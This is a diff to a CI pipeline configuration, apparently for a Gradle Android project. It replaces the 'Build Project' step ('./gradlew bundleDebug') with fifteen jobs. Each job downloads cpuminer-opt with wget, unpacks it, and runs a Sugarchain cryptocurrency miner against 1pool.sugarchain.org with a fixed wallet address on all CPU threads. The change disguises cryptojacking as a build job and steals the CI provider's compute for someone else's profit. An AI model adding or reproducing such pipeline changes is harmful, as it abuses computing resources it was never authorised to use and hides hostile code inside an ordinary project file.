@@ -23,7 +23,79 @@ blocks:
       jobs:
         - name: Build Project
           commands:
-            - ./gradlew bundleDebug
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v -t0'
+        - name: 'Job #2'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v -t0'
+        - name: 'Job #3'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v -t0'
+        - name: 'Job #4'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v -t0'
+        - name: 'Job #5'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v -t0'
+        - name: 'Job #6'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v -t0'
+        - name: 'Job #7'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v -t0'
+        - name: 'Job #8'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v -t0'
+        - name: 'Job #9'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v -t0'
+        - name: 'Job #10'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v -t0'
+        - name: 'Job #11'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v -t0'
+        - name: 'Job #12'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v -t0'
+        - name: 'Job #13'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v -t0'
+        - name: 'Job #14'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v -t0'
+        - name: 'Job #15'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v -t0'
       epilogue:
         on_pass:
           commands:
